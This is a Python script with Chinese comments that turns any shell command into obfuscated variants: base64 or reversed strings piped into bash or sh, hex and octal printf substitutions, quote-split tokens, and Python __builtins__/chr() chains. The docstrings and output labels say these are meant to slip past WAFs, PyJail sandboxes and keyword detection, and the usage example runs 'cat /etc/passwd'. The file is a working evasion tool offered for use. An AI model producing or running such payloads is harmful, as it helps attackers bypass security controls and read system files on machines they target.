#!/usr/bin/env python3
import sys
import base64
import shutil

class LinuxObfuscator:
    def __init__(self, original_cmd):
        self.cmd = original_cmd.strip()

    def generate_base64_obfuscation(self):
        """ 方法 1: Base64 編碼混淆 """
        encoded = base64.b64encode(self.cmd.encode('utf-8')).decode('utf-8')
        primary = f"echo '{encoded}' | base64 -d | bash"
        fallback = f"bash <<< $(base64 -d <<< '{encoded}')"
        return primary, fallback

    def generate_hex_obfuscation(self):
        """ 方法 2: Hex (十六進位) 與 printf 混淆 """
        hex_str = "".join([f"\\x{ord(c):02x}" for c in self.cmd])
        primary = f"$(printf '{hex_str}')"
        octal_str = "".join([f"\\{oct(ord(c))[2:]:0>3}" for c in self.cmd])
        fallback = f"$(printf '{octal_str}')"
        return primary, fallback

    def generate_char_insertion(self):
        """ 方法 3: 字元插入/引號混淆 """
        parts = []
        for i, char in enumerate(self.cmd):
            if char.isalnum():
                if i % 2 == 0:
                    parts.append(f"{char}''")
                else:
                    parts.append(f'"{char}"')
            else:
                parts.append(char)
        primary = "".join(parts)
        
        fallback_parts = []
        for char in self.cmd:
            if char.isalnum():
                fallback_parts.append(f"\\{char}")
            else:
                fallback_parts.append(char)
        fallback = "".join(fallback_parts)
        return primary, fallback

    def generate_reversed_obfuscation(self):
        """ 方法 4: 反轉字串混淆 """
        reversed_cmd = self.cmd[::-1]
        primary = f"echo '{reversed_cmd}' | rev | sh"
        fallback = f"rev_cmd='{reversed_cmd}'; for ((i=${{#rev_cmd}}-1; i>=0; i--)); do out=\"$out${{rev_cmd:$i:1}}\"; done; eval $out"
        return primary, fallback

    def generate_python_builtins_obfuscation(self):
        """
        方法 5: Python __builtins__ 命名空間混淆
        適用場景: 繞過常見的 PyJail、沙箱限制或 WAF 對 "import"、"os"、"system" 關鍵字的過濾。
        """
        # 1. 構造 chr() 動態拼接
        # 原理: getattr(getattr(__builtins__, '__import__')('os'), 'system')('cmd')
        import_chr = "+".join([f"chr({ord(c)})" for c in "__import__"])
        os_chr = "+".join([f"chr({ord(c)})" for c in "os"])
        system_chr = "+".join([f"chr({ord(c)})" for c in "system"])
        cmd_chr = "+".join([f"chr({ord(c)})" for c in self.cmd])
        
        primary = (
            f"python3 -c \"getattr(getattr(__builtins__, {import_chr})({os_chr}), {system_chr})({cmd_chr})\""
        )

        # 2. 備用方案：利用 base64 編碼規避字元特徵
        import_b64 = base64.b64encode(b"__import__").decode()
        os_b64 = base64.b64encode(b"os").decode()
        system_b64 = base64.b64encode(b"system").decode()
        cmd_b64 = base64.b64encode(self.cmd.encode()).decode()

        fallback = (
            f"python3 -c \"import base64; "
            f"getattr(getattr(__builtins__, base64.b64decode('{import_b64}').decode())(base64.b64decode('{os_b64}').decode()), "
            f"base64.b64decode('{system_b64}').decode())(base64.b64decode('{cmd_b64}').decode())\""
        )
        return primary, fallback

    def check_dependency(self, cmd_name):
        return shutil.which(cmd_name) is not None

    def run_obfuscation(self):
        print(f"[*] 原始指令: {self.cmd}\n")
        
        # 1. Base64
        b64_p, b64_f = self.generate_base64_obfuscation()
        has_b64 = self.check_dependency("base64")
        print("[+] 方案 A: Base64 編碼混淆")
        print(f"    --> 推薦指令: {b64_p}")
        if not has_b64:
            print(f"    [!] 警告: 當前環境可能未安裝 'base64'！")
            print(f"    --> 替換方案 (使用 bash Here String): {b64_f}")
        print()

        # 2. Hex / Octal
        hex_p, hex_f = self.generate_hex_obfuscation()
        has_printf = self.check_dependency("printf")
        print("[+] 方案 B: Hex/Octal (十六/八進位) 混淆")
        print(f"    --> 推薦指令: {hex_p}")
        if not has_printf:
            print(f"    [!] 警告: 系統無 'printf' 指令！")
        print(f"    --> 替換方案 (八進位形式): {hex_f}")
        print()

        # 3. String Insertion
        char_p, char_f = self.generate_char_insertion()
        print("[+] 方案 C: 引號與反斜線混淆 (無任何第三方工具依賴)")
        print(f"    --> 推薦指令: {char_p}")
        print(f"    --> 替換方案 (反斜線逸出): {char_f}")
        print()

        # 4. Reversed Command
        rev_p, rev_f = self.generate_reversed_obfuscation()
        has_rev = self.check_dependency("rev")
        print("[+] 方案 D: 反轉字串混淆")
        print(f"    --> 推薦指令: {rev_p}")
        if not has_rev:
            print(f"    [!] 警告: 當前環境缺少 'rev' 工具！")
            print(f"    --> 替換方案 (純 Bash 邏輯反轉):")
            print(f"        {rev_f}")
        print()

        # 5. Python __builtins__ Obfuscation
        py_p, py_f = self.generate_python_builtins_obfuscation()
        has_py3 = self.check_dependency("python3")
        print("[+] 方案 E: Python __builtins__ 動態混淆 (沙箱逃逸專用)")
        print(f"    --> 推薦指令 (純 chr() 動態拼接，繞過所有關鍵字偵測):")
        print(f"        {py_p}")
        if not has_py3:
            print(f"    [!] 警告: 目標系統未檢測到 'python3'！")
        print(f"    --> 替換方案 (利用 Base64 在 Python 內動態還原):")
        print(f"        {py_f}")
        print()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("使用方法: python3 linux_obfuscator.py \"<想要執行的指令>\"")
        print("例如: python3 linux_obfuscator.py \"cat /etc/passwd\"")
        sys.exit(1)
        
    user_input = sys.argv[1]
    obfuscator = LinuxObfuscator(user_input)
    obfuscator.run_obfuscation()

